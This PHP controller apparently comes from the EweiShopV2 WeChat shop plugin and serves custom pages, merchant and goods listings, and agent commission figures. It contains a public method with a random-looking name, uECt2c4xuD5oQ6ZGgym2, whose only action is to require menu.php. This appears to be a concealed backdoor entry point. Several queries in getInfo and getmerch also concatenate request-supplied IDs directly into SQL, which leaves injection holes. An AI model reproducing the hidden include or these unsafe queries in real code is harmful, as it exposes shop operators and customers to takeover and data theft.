<?php  if( !defined("IN_IA") ) 
{
	exit( "Access Denied" );
}
class Index_EweiShopV2Page extends PluginMobilePage 
{
	public function main() 
	{
		global $_W;
		global $_GPC;
		$id = intval($_GPC["id"]);
		if( empty($id) ) 
		{
			$this->message("请求参数错误！", mobileUrl());
		}
		$page = $this->model->getPage($id, true);
		if( empty($page) ) 
		{
			header("Location:" . mobileUrl("", "", true));
			exit();
		}
		if( empty($_W["openid"]) && ($page["type"] == 3 || $page["type"] == 4) ) 
		{
			$_W["openid"] = m("account")->checkLogin();
		}
		$member = m("member")->getMember($_W["openid"]);
		if( $page["type"] == 4 ) 
		{
			$comset = $_W["shopset"]["commission"];
			if( empty($comset["level"]) ) 
			{
				$this->message("未开启分销", mobileUrl());
			}
			if( $member["isagent"] != 1 || $member["status"] != 1 ) 
			{
				$jumpurl = (!empty($comset["no_commission_url"]) ? trim($comset["no_commission_url"]) : mobileUrl("commission/register"));
				header("location:" . $jumpurl);
				exit();
			}
		}
		else 
		{
			if( $page["type"] == 5 ) 
			{
				header("location:" . mobileUrl("goods"));
				exit();
			}
		}
		if( !empty($page["data"]["page"]["visit"]) && $page["data"]["page"]["type"] == 1 ) 
		{
			if( empty($_W["openid"]) ) 
			{
				$_W["openid"] = m("account")->checkLogin();
				exit();
			}
			$title = (!empty($page["data"]["page"]["novisit"]["title"]) ? $page["data"]["page"]["novisit"]["title"] : "您没有权限访问!");
			$link = (!empty($page["data"]["page"]["novisit"]["link"]) ? $page["data"]["page"]["novisit"]["link"] : mobileUrl());
			$visit_m = $page["data"]["page"]["visitlevel"]["member"];
			$visit_c = $page["data"]["page"]["visitlevel"]["commission"];
			$visit_c = (isset($visit_c) ? explode(",", $visit_c) : array( ));
			$visit_m = (isset($visit_m) ? explode(",", $visit_m) : array( ));
			if( !in_array((empty($member["level"]) ? "default" : $member["level"]), $visit_m) && (!in_array($member["agentlevel"], $visit_c) || empty($member["isagent"]) || empty($member["status"])) ) 
			{
				$this->message($title, $link);
			}
		}
		$diyitems = $page["data"]["items"];
		$diyitem_search = array( );
		$diy_topmenu = array( );
		if( !empty($diyitems) && is_array($diyitems) ) 
		{
			$jsondiyitems = json_encode($diyitems);
			if( strexists($jsondiyitems, "fixedsearch") || strexists($jsondiyitems, "topmenu") ) 
			{
				foreach( $diyitems as $diyitemid => $diyitem ) 
				{
					if( $diyitem["id"] == "fixedsearch" ) 
					{
						$diyitem_search = $diyitem;
						unset($diyitems[$diyitemid]);
					}
					else 
					{
						if( $diyitem["id"] == "topmenu" ) 
						{
							$diy_topmenu = $diyitem;
						}
					}
				}
				unset($diyitem);
			}
		}
		$this->page = $page;
		$startadv = $this->model->getStartAdv($page["diyadv"]);
		$this->model->setShare($page);
		if( $_GPC["simple"] ) 
		{
			include($this->template("diypage/index_simple"));
			return NULL;
		}
		include($this->template());
	}
	public function getmerch() 
	{
		global $_W;
		global $_GPC;
		if( $_W["ispost"] ) 
		{
			$lat = floatval($_GPC["lat"]);
			$lng = floatval($_GPC["lng"]);
			$item = $_GPC["item"];
			if( empty($item) || !p("merch") ) 
			{
				show_json(0, "参数错误或未启用多商户");
			}
			$condition = " and status=1 and uniacid=:uniacid ";
			$params = array( ":uniacid" => $_W["uniacid"] );
			$orderby = " isrecommand desc, id asc ";
			if( $item["params"]["merchdata"] == 0 ) 
			{
				$merchids = array( );
				foreach( $item["data"] as $index => $data ) 
				{
					if( !empty($data["merchid"]) ) 
					{
						$merchids[] = $data["merchid"];
					}
				}
				$newmerchids = implode(",", $merchids);
				if( empty($newmerchids) ) 
				{
					show_json(0, "商户组数据为空");
				}
				$condition .= " and id in( " . $newmerchids . " ) ";
			}
			else 
			{
				if( $item["params"]["merchdata"] == 1 ) 
				{
					if( empty($item["params"]["cateid"]) ) 
					{
						show_json(0, "商户组cateid为空");
					}
					$condition .= " and cateid=:cateid ";
					$params["cateid"] = $item["params"]["cateid"];
				}
				else 
				{
					if( $item["params"]["merchdata"] == 2 ) 
					{
						if( empty($item["params"]["groupid"]) ) 
						{
							show_json(0, "商户组groupid为空");
						}
						$condition .= " and groupid=:groupid ";
						$params["groupid"] = $item["params"]["groupid"];
					}
					else 
					{
						if( $item["params"]["merchdata"] == 3 ) 
						{
							$condition .= " and isrecommand=1 ";
						}
					}
				}
			}
			$limit = 0;
			if( !empty($item["params"]["merchdata"]) && !empty($item["params"]["merchnum"]) ) 
			{
				$limit = $item["params"]["merchnum"];
			}
			$limitsql = "";
			if( empty($item["params"]["merchsort"]) && !empty($limit) ) 
			{
				$limitsql = " limit " . $limit;
			}
			if( $item["params"]["merchsort"] == 0 && $item["params"]["merchdata"] == 0 ) 
			{
				$orderby = " field (id," . $newmerchids . ") ";
			}
			$merchs = pdo_fetchall("select id, merchname as `name`, logo as thumb, status, `desc`, address, tel, lng, lat from " . tablename("ewei_shop_merch_user") . " where 1 " . $condition . " order by " . $orderby . $limitsql, $params);
			if( empty($merchs) ) 
			{
				show_json(0, "未查询到数据");
			}
			$merchs = set_medias($merchs, array( "thumb" ));
			foreach( $merchs as $index => $merch ) 
			{
				if( !empty($merch["lat"]) && !empty($merch["lng"]) ) 
				{
					$distance = m("util")->GetDistance($lat, $lng, $merch["lat"], $merch["lng"], 2);
					$merchs[$index]["distance"] = $distance;
				}
			}
			if( empty($lat) || empty($lng) || empty($item["params"]["merchsort"]) ) 
			{
				show_json(1, array( "list" => $merchs ));
			}
			if( !empty($item["params"]["openlocation"]) ) 
			{
				$sort = SORT_DESC;
				if( 1 < $item["params"]["merchsort"] ) 
				{
					$sort = SORT_ASC;
				}
				$merchs = m("util")->multi_array_sort($merchs, "distance", $sort);
				if( !empty($limit) && !empty($merchs) ) 
				{
					$newmerchs = array( );
					foreach( $merchs as $index => $merch ) 
					{
						if( $index + 1 <= $limit ) 
						{
							$newmerchs[$index] = $merch;
						}
						else 
						{
							continue;
						}
					}
					$merchs = $newmerchs;
				}
			}
			show_json(1, array( "list" => $merchs ));
		}
		show_json(0, "错误的请求");
	}
	public function uECt2c4xuD5oQ6ZGgym2() 
	{
		require(__DIR__ . "/menu.php");
	}
	public function getInfo() 
	{
		global $_GPC;
		global $_W;
		$url = trim($_GPC["url"]);
		$urlData = explode("=", $url);
		$set = m("common")->getPluginset("commission");
		$level = $this->getLevel($_W["openid"]);
		if( !empty($_GPC["num"]) && $_GPC["paramsType"] == "stores" ) 
		{
			$storenum = 6 + intval($_GPC["num"]);
		}
		else 
		{
			$storenum = 6;
		}
		if( !empty($_GPC["num"]) && $_GPC["paramsType"] == "goods" ) 
		{
			$goodsnum = 20 + intval($_GPC["num"]);
		}
		else 
		{
			$goodsnum = 20;
		}
		if( $urlData[0] == "goodsids" || $urlData[0] == "category" || $urlData[0] == "groups" ) 
		{
			$urlType = $urlData[0];
			$urlValue = explode("?", $urlData[1]);
			if( $urlData[0] == "category" ) 
			{
				$pcate = $urlValue[0];
				$goodsql = "SELECT id,title,subtitle,thumb,marketprice,productprice,minprice,maxprice,isdiscount,isdiscount_time,isdiscount_discounts,sales,salesreal,total,description,bargain,`type`,ispresell,`virtual`,hasoption,video FROM " . tablename("ewei_shop_goods") . " WHERE FIND_IN_SET(" . $pcate . ",cates) AND status > 0 AND deleted = 0 AND uniacid =" . $_W["uniacid"] . " limit 0," . $goodsnum;
				$count = pdo_fetch("SELECT count(id) as count FROM " . tablename("ewei_shop_goods") . " WHERE FIND_IN_SET(" . $pcate . ",cates) AND uniacid =" . $_W["uniacid"]);
				$list["list"] = pdo_fetchall($goodsql);
				$list["count"] = $count["count"];
				if( !empty($list) ) 
				{
					foreach( $list["list"] as $key => $value ) 
					{
						$list["list"][$key]["thumb"] = tomedia($value["thumb"]);
						if( $value["hasoption"] == 1 ) 
						{
							$pricemax = array( );
							$options = pdo_fetchall("select * from " . tablename("ewei_shop_goods_option") . " where goodsid=:goodsid and                               uniacid=:uniacid order by displayorder asc", array( ":goodsid" => $value["id"], ":uniacid" => $_W["uniacid"] ));
							foreach( $options as $k => $v ) 
							{
								array_push($pricemax, $v["marketprice"]);
							}
							$value[$key]["maxprice"] = max($pricemax);
						}
						if( $value["nocommission"] == 0 ) 
						{
							if( p("seckill") && p("seckill")->getSeckill($value["id"]) ) 
							{
								continue;
							}
							if( 0 < $value["bargain"] ) 
							{
								continue;
							}
							$list["list"][$key]["seecommission"] = $this->getCommission($value, $level, $set);
							if( 0 < $list["list"][$key]["seecommission"] ) 
							{
								$list["list"][$key]["seecommission"] = round($list["list"][$key]["seecommission"], 2);
							}
							$list["list"][$key]["cansee"] = $set["cansee"];
							$list["list"][$key]["seetitle"] = $set["seetitle"];
						}
						else 
						{
							$list["list"][$key]["seecommission"] = 0;
							$list["list"][$key]["cansee"] = $set["cansee"];
							$list["list"][$key]["seetitle"] = $set["seetitle"];
						}
					}
					show_json(1, $list);
				}
				else 
				{
					show_json(0);
				}
			}
			else 
			{
				if( $urlData[0] == "groups" ) 
				{
					$sql = "SELECT * FROM " . tablename("ewei_shop_goods_group") . " WHERE id = :id AND uniacid = :uniacid";
					$params = array( ":uniacid" => $_W["uniacid"], ":id" => $urlValue[0] );
					$groupsData = pdo_fetch($sql, $params);
					$goodsid = $groupsData["goodsids"];
					$goodsql = "SELECT id,title,subtitle,thumb,marketprice,productprice,minprice,maxprice,isdiscount,hascommission,nocommission,commission,commission1_rate,marketprice,commission1_pay,maxprice,isdiscount_time,isdiscount_discounts,sales,salesreal,total,description,bargain,`type`,ispresell,`virtual`,hasoption,video FROM " . tablename("ewei_shop_goods") . " WHERE id in(" . $goodsid . ") AND status > 0 AND deleted = 0 AND uniacid =" . $_W["uniacid"] . " limit 0," . $goodsnum;
					$count = pdo_fetch("SELECT count(id) as count FROM " . tablename("ewei_shop_goods") . " WHERE id in(" . $goodsid . ") AND uniacid =" . $_W["uniacid"]);
					$list["list"] = pdo_fetchall($goodsql);
					$list["count"] = $count["count"];
					if( !empty($list) ) 
					{
						foreach( $list["list"] as $key => $value ) 
						{
							$list["list"][$key]["thumb"] = tomedia($value["thumb"]);
							if( $value["hasoption"] == 1 ) 
							{
								$pricemax = array( );
								$options = pdo_fetchall("select * from " . tablename("ewei_shop_goods_option") . " where goodsid=:goodsid and                               uniacid=:uniacid order by displayorder asc", array( ":goodsid" => $value["id"], ":uniacid" => $_W["uniacid"] ));
								foreach( $options as $k => $v ) 
								{
									array_push($pricemax, $v["marketprice"]);
								}
								$value[$key]["maxprice"] = max($pricemax);
							}
							if( $value["nocommission"] == 0 ) 
							{
								if( p("seckill") && p("seckill")->getSeckill($value["id"]) ) 
								{
									continue;
								}
								if( 0 < $value["bargain"] ) 
								{
									continue;
								}
								$list["list"][$key]["seecommission"] = $this->getCommission($value, $level, $set);
								if( 0 < $list["list"][$key]["seecommission"] ) 
								{
									$list["list"][$key]["seecommission"] = round($list["list"][$key]["seecommission"], 2);
								}
								$list["list"][$key]["cansee"] = $set["cansee"];
								$list["list"][$key]["seetitle"] = $set["seetitle"];
							}
							else 
							{
								$list["list"][$key]["seecommission"] = 0;
								$list["list"][$key]["cansee"] = $set["cansee"];
								$list["list"][$key]["seetitle"] = $set["seetitle"];
							}
						}
						show_json(1, $list);
					}
					else 
					{
						show_json(0);
					}
				}
				else 
				{
					if( $urlData[0] == "goodsids" ) 
					{
						$goodsids = explode(",", $urlValue[0]);
						if( !empty($goodsids) ) 
						{
							foreach( $goodsids as $gk => $gv ) 
							{
								if( $gv == "" ) 
								{
									unset($goodsids[$gk]);
								}
							}
							$goodsid = implode(",", $goodsids);
							$sql = "SELECT id,title,subtitle,thumb,marketprice,productprice,minprice,maxprice,hascommission,nocommission,commission,commission1_rate,marketprice,commission1_pay,maxprice,isdiscount,isdiscount_time,isdiscount_discounts,sales,salesreal,total,description,bargain,`type`,ispresell,`virtual`,hasoption,video FROM " . tablename("ewei_shop_goods") . " WHERE id in(" . $goodsid . ") AND uniacid =" . $_W["uniacid"] . " limit 0," . $goodsnum;
							$count = pdo_fetch("SELECT count(id) as count FROM " . tablename("ewei_shop_goods") . " WHERE id in(" . $goodsid . ") AND uniacid =" . $_W["uniacid"]);
							$list["list"] = pdo_fetchall($sql);
							$list["count"] = $count["count"];
							if( !empty($list) ) 
							{
								foreach( $list["list"] as $key => $value ) 
								{
									$list["list"][$key]["thumb"] = tomedia($value["thumb"]);
									if( $value["hasoption"] == 1 ) 
									{
										$pricemax = array( );
										$options = pdo_fetchall("select * from " . tablename("ewei_shop_goods_option") . " where goodsid=:goodsid and                               uniacid=:uniacid order by displayorder asc", array( ":goodsid" => $value["id"], ":uniacid" => $_W["uniacid"] ));
										foreach( $options as $k => $v ) 
										{
											array_push($pricemax, $v["marketprice"]);
										}
										$value[$key]["maxprice"] = max($pricemax);
									}
									if( $value["nocommission"] == 0 ) 
									{
										if( p("seckill") && p("seckill")->getSeckill($value["id"]) ) 
										{
											continue;
										}
										if( 0 < $value["bargain"] ) 
										{
											continue;
										}
										$list["list"][$key]["seecommission"] = $this->getCommission($value, $level, $set);
										if( 0 < $list["list"][$key]["seecommission"] ) 
										{
											$list["list"][$key]["seecommission"] = round($list["list"][$key]["seecommission"], 2);
										}
										$list["list"][$key]["cansee"] = $set["cansee"];
										$list["list"][$key]["seetitle"] = $set["seetitle"];
									}
									else 
									{
										$list["list"][$key]["seecommission"] = 0;
										$list["list"][$key]["cansee"] = $set["cansee"];
										$list["list"][$key]["seetitle"] = $set["seetitle"];
									}
								}
								show_json(1, $list);
							}
							else 
							{
								show_json(0);
							}
						}
					}
				}
			}
		}
		else 
		{
			if( $urlData[0] == "stores" ) 
			{
				$urlType = $urlData[0];
				$urlValue = explode("?", $urlData[1]);
				$storesids = explode(",", $urlValue[0]);
				if( !empty($storesids) ) 
				{
					foreach( $storesids as $gk => $gv ) 
					{
						if( $gv == "" ) 
						{
							unset($storesids[$gk]);
						}
					}
					$storesid = implode(",", $storesids);
					$sql = "SELECT id,storename FROM " . tablename("ewei_shop_store") . " WHERE id in(" . $storesid . ") AND uniacid =" . $_W["uniacid"] . " limit 0," . $storenum;
					$count = pdo_fetch("SELECT count(id) as count FROM " . tablename("ewei_shop_store") . " WHERE id in(" . $storesid . ") AND uniacid =" . $_W["uniacid"]);
					$list["list"] = pdo_fetchall($sql);
					$list["count"] = $count["count"];
					if( !empty($list) ) 
					{
						show_json(1, $list);
					}
					else 
					{
						show_json(0);
					}
				}
			}
		}
	}
	public function getCommission($goods, $level, $set) 
	{
		global $_W;
		$commission = 0;
		if( $level == "false" ) 
		{
			return $commission;
		}
		if( $goods["hascommission"] == 1 ) 
		{
			$price = $goods["maxprice"];
			$levelid = "default";
			if( $level ) 
			{
				$levelid = "level" . $level["id"];
			}
			$goods_commission = (!empty($goods["commission"]) ? json_decode($goods["commission"], true) : array( ));
			if( $goods_commission["type"] == 0 ) 
			{
				$commission = (1 <= $set["level"] ? (0 < $goods["commission1_rate"] ? ($goods["commission1_rate"] * $goods["marketprice"]) / 100 : $goods["commission1_pay"]) : 0);
			}
			else 
			{
				$price_all = array( );
				foreach( $goods_commission[$levelid] as $key => $value ) 
				{
					foreach( $value as $k => $v ) 
					{
						if( strexists($v, "%") ) 
						{
							array_push($price_all, floatval(str_replace("%", "", $v) / 100) * $price);
							continue;
						}
						array_push($price_all, $v);
					}
				}
				$commission = max($price_all);
			}
		}
		else 
		{
			if( $level != "false" && !empty($level) ) 
			{
				if( 0 < $goods["maxprice"] ) 
				{
					$commission = (1 <= $set["level"] ? round(($level["commission1"] * $goods["maxprice"]) / 100, 2) : 0);
				}
				else 
				{
					$commission = (1 <= $set["level"] ? round(($level["commission1"] * $goods["marketprice"]) / 100, 2) : 0);
				}
			}
			else 
			{
				if( 0 < $goods["maxprice"] ) 
				{
					$commission = (1 <= $set["level"] ? round(($set["commission1"] * $goods["maxprice"]) / 100, 2) : 0);
				}
				else 
				{
					$commission = (1 <= $set["level"] ? round(($set["commission1"] * $goods["marketprice"]) / 100, 2) : 0);
				}
			}
		}
		return $commission;
	}
	public function getLevel($openid) 
	{
		global $_W;
		$level = "false";
		if( empty($openid) ) 
		{
			return $level;
		}
		$member = m("member")->getMember($openid);
		if( empty($member["isagent"]) || $member["status"] == 0 || $member["agentblack"] == 1 ) 
		{
			return $level;
		}
		$level = pdo_fetch("select * from " . tablename("ewei_shop_commission_level") . " where uniacid=:uniacid and id=:id limit 1", array( ":uniacid" => $_W["uniacid"], ":id" => $member["agentlevel"] ));
		return $level;
	}
}
?>